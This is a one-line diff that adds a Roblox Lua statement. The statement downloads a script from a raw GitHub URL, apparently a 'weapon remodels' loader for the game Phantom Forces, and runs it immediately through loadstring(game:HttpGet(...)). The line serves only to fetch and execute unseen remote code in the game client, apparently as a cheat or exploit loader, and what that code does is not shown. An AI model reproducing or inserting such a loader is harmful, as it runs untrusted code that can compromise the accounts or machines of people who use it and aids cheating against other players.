@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam4-4mkg76lbiekb52.lua"))()
